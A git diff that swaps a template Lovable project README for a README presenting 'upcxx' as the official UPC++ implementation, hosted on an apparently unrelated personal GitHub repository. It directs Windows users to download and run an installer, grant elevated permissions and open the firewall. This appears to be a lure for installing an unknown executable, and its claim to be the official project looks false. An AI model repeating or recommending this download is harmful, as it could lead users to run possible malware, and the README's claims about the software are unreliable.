@@ -1,73 +1,86 @@
-# Welcome to your Lovable project
+# ⚡ upcxx - Build fast distributed parallel computing systems
 
-## Project info
+[![Download upcxx](https://img.shields.io/badge/Download-upcxx-blue.svg)](https://github.com/KheangCodekhmer/upcxx)
 
-**URL**: https://lovable.dev/projects/6f8c4545-2dc5-4b4f-aad4-b8d173d6fa1c
+## 📌 Project Overview
 
-## How can I edit this code?
+The upcxx library helps computers work together on large tasks. It allows multiple machines to act as one powerful system. This library provides the tools for parallel computing. It manages how different computers exchange data and commands. You use this library to speed up complex calculations that require high performance. 
 
-There are several ways of editing your application.
+This repository contains the official implementation of the UPC++ version 1.0 standard. It supports modern versions of the C++ programming language. You gain access to efficient remote procedure calls and shared memory features.
 
-**Use Lovable**
+## 🛠 Features
 
-Simply visit the [Lovable Project](https://lovable.dev/projects/6f8c4545-2dc5-4b4f-aad4-b8d173d6fa1c) and start prompting.
+*   **Asynchronous Tasks:** Your programs perform multiple actions at once without waiting for each step to finish.
+*   **Data Distribution:** Spread heavy data loads across many different computers.
+*   **Remote Calls:** Run a function on a distant computer and receive the result back automatically.
+*   **Memory Management:** Access data stored on other machines through a simple global address space.
+*   **Broad Compatibility:** This library works with current C++ standards including C++11, C++14, C++17, and C++20.
 
-Changes made via Lovable will be committed automatically to this repo.
+## ⚙️ System Requirements
 
-**Use your preferred IDE**
+Before you install this software, ensure your computer meets these requirements:
 
-If you want to work locally using your own IDE, you can clone this repo and push changes. Pushed changes will also be reflected in Lovable.
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Processor:** A modern multi-core processor.
+*   **Memory:** At least 8GB of RAM.
+*   **Storage:** 500MB of free disk space.
+*   **Network:** An active internet connection for data transfer between nodes.
 
-The only requirement is having Node.js & npm installed - [install with nvm](https://github.com/nvm-sh/nvm#installing-and-updating)
+## 📥 Getting Started
 
-Follow these steps:
+You need to obtain the software package from the official source. Use the link below to reach the project page.
 
-```sh
-# Step 1: Clone the repository using the project's Git URL.
-git clone <YOUR_GIT_URL>
+[Visit this page to download](https://github.com/KheangCodekhmer/upcxx)
 
-# Step 2: Navigate to the project directory.
-cd <YOUR_PROJECT_NAME>
+Follow these steps to prepare your environment:
 
-# Step 3: Install the necessary dependencies.
-npm i
+1.  Navigate to the provided download link.
+2.  Look for the latest release version on the page.
+3.  Select the installer file that matches your Windows version.
+4.  Save the file to a folder you can easily find.
 
-# Step 4: Start the development server with auto-reloading and an instant preview.
-npm run dev
-```
+## 🚀 Installation Guide
 
-**Edit a file directly in GitHub**
+Once you download the installer file, follow these instructions to set up the library on your machine:
 
-- Navigate to the desired file(s).
-- Click the "Edit" button (pencil icon) at the top right of the file view.
-- Make your changes and commit the changes.
+1.  Locate the installer file in your Downloads folder.
+2.  Double-click the file to start the setup wizard.
+3.  Grant permission if Windows asks to allow changes to your device.
+4.  Follow the prompts in the wizard. Click "Next" to continue through user agreement screens.
+5.  Choose the default installation path unless you have a specific reason to change it.
+6.  Wait for the progress bar to finish. This process takes a few minutes.
+7.  Click "Finish" to complete the installation.
 
-**Use GitHub Codespaces**
+## 🔍 Verifying the Setup
 
-- Navigate to the main page of your repository.
-- Click on the "Code" button (green button) near the top right.
-- Select the "Codespaces" tab.
-- Click on "New codespace" to launch a new Codespace environment.
-- Edit files directly within the Codespace and commit and push your changes once you're done.
+You may verify that the installation succeeded by checking your system path. Open the Command Prompt from your start menu. Type the following command:
 
-## What technologies are used for this project?
+upcxx --version
 
-This project is built with:
+If the system displays the version number, your installation functions correctly. If you see an error, restart your computer and try the command again.
 
-- Vite
-- TypeScript
-- React
-- shadcn-ui
-- Tailwind CSS
+## 🏗 Using the Library
 
-## How can I deploy this project?
+After installation, the library integrates into your development environment. You may include the header files in your C++ projects. These tools handle the complex details of network communication for you. 
 
-Simply open [Lovable](https://lovable.dev/projects/6f8c4545-2dc5-4b4f-aad4-b8d173d6fa1c) and click on Share -> Publish.
+When you run an application built with upcxx, it requires a network connection to communicate with other instances of the program. Ensure your firewall settings allow the application to send and receive data across your network. 
 
-## Can I connect a custom domain to my Lovable project?
+## ❓ Frequently Asked Questions
 
-Yes, you can!
+**Does this library require an internet connection?**
+Yes. Since the software allows distributed computing, it needs a network to link different computers. 
 
-To connect a domain, navigate to Project > Settings > Domains and click Connect Domain.
+**Is this compatible with older compilers?**
+The library requires a compiler that supports C++11 or newer. We recommend using a recent version of Visual Studio for the best experience on Windows.
 
-Read more here: [Setting up a custom domain](https://docs.lovable.dev/tips-tricks/custom-domain#step-by-step-guide)
+**How do I update the library?**
+Check the repository page regularly. The maintainers post new releases when they add features or fix bugs. Download the new installer and run it over your existing one to update your files.
+
+**Where can I find more help?**
+If you encounter errors, examine the logs generated in your project folder. The output usually describes the specific network or memory conflict. 
+
+## 🛡 Security and Performance
+
+The library follows basic security practices for network applications. It uses proven methods to handle remote interactions. Always keep your system software updated to protect your network. 
+
+Performance depends on your network speed and local memory bandwidth. To get the best results, use a wired local area network instead of a wireless connection. This reduces latency when machines exchange information.
